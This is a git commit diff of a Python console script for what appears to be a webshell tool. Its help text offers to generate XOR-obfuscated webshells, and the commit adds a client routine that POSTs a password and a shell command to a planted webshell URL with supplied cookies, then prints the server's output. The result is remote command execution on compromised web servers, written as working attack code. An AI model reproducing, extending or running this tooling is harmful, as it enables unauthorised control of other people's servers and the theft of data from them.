358ecb8164fb20ea537fd24a3fa9af3251de4938
Y5neKO <1727058834@qq.com>
2024-03-11 18:03:55 +0800

    Fix.

--- core/console.py
+++ core/console.py
@@ -10,15 +10,25 @@ import os
 import requests
 import base64
 
+from core.color import *
 from core.general import *
 
 
-def request(url, payload):
-    headers = {"Content-Type": "application/json;charset=gbk"}
-    cookies = {"user_token": payload}
-    response = requests.get(url=url, headers=headers, cookies=cookies)
-    response.encoding = "gbk"
-    return response.text
+# def request(url, payload):
+#     headers = {"Content-Type": "application/json;charset=gbk"}
+#     cookies = {"user_token": payload}
+#     response = requests.get(url=url, headers=headers, cookies=cookies)
+#     response.encoding = "gbk"
+#     return response.text
+
+
+def parse_cookies_from_str(cookie_str):
+    """将 cookie 字符串解析为字典"""
+    cookies = {}
+    for item in cookie_str.split(';'):
+        key, value = item.strip().split('=', 1)
+        cookies[key] = value
+    return cookies
 
 
 def xor_decode(string, key):
@@ -53,8 +63,8 @@ def main():
     parse.add_argument("-g", "--generate_webshell", action="store", type=str,
                        help="生成webshell的文件名")
     parse.add_argument("-w", "--webshell", action="store", type=str, help="webshell路径")
-    parse.add_argument("--get", action="store", type=str, help="GET参数")
     parse.add_argument("--cookie", action="store", type=str, help="Cookie值(格式: User=123;Pass=456)")
+    parse.add_argument("-p", "--password", action="store", type=str, help="Webshell密码")
     parse.add_argument("-x", "--xor", action="store", type=str, help="xor加密key")
     parse.add_argument("-c", "--cmd", action="store", type=str, help="执行命令")
 
@@ -72,5 +82,15 @@ def main():
         print("------------------------------任务结束------------------------------")
 
     if args.webshell is not None:
-        if args.get & args.cookie & args.cmd:
-            print(args.get + args.cookie + args.cmd)
+        print("------------------------------开始任务------------------------------")
+        if args.cookie is not None and args.password is not None and args.cmd is not None:
+            cookies = parse_cookies_from_str(args.cookie) if args.cookie else {print("Cookie格式错误")}
+            print("webshell地址：" + args.webshell)
+            print("Cookie: " + str(cookies))
+            print("Passowrd: " + args.password + "=" + args.cmd)
+            response = requests.post(url=args.webshell, cookies=cookies, data=args.password + "=" + args.cmd)
+            print(response)
+            print(response.text)
+        else:
+            print("[" + color("+", "red") + "]缺少参数")
+        print("------------------------------任务结束------------------------------")
